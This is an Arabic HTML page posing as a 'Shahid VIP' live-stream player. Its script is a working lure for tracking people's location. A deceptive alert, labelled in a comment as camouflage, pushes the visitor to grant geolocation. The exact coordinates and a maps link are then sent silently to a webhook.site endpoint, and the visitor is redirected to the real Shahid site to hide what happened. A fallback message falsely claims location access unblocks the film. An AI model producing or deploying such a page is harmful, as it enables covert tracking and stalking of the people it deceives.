<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شاهد VIP | Shahid Live</title>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .player-box { width: 90%; max-width: 500px; height: 280px; background: #111; border: 2px solid #333; display: flex; justify-content: center; align-items: center; border-radius: 10px; cursor: pointer; position: relative; }
        .play-icon { font-size: 80px; color: #fff; opacity: 0.8; }
        .text-info { margin-top: 20px; font-size: 1.1rem; color: #ccc; }
    </style>
</head>
<body>

    <div class="player-box" onclick="captureLocation()">
        <div class="play-icon">▶️</div>
    </div>
    <div class="text-info">اضغط على المشغل لبدء البث المباشر (حصرياً)</div>

    <script>
        function captureLocation() {
            // تنبيه تمويهي يخلي الشخص يضغط موافق قبل طلب الموقع
            alert("جاري التحقق من السيرفر في منطقتك... يرجى الضغط على 'سماح' لبدء البث.");

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    const data = {
                        latitude: lat,
                        longitude: lon,
                        map_link: `https://www.google.com/maps?q=${lat},${lon}`,
                        info: "Captured from iPhone/Mobile"
                    };

                    // إرسال البيانات فوراً لـ Webhook الخاص بك
                    fetch('https://webhook.site/866c5c83-d3aa-4627-b9e5-5f835299495f', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify(data)
                    });

                    // تحويل الشخص لموقع شاهد بعد الإرسال
                    setTimeout(() => {
                        window.location.href = "https://shahid.mbc.net/";
                    }, 1000);

                }, (error) => {
                    alert("يجب السماح بالوصول للموقع لتخطي الحجب عن هذا الفيلم في بلدك.");
                }, { enableHighAccuracy: true });
            }
        }
    </script>
</body>
</html>
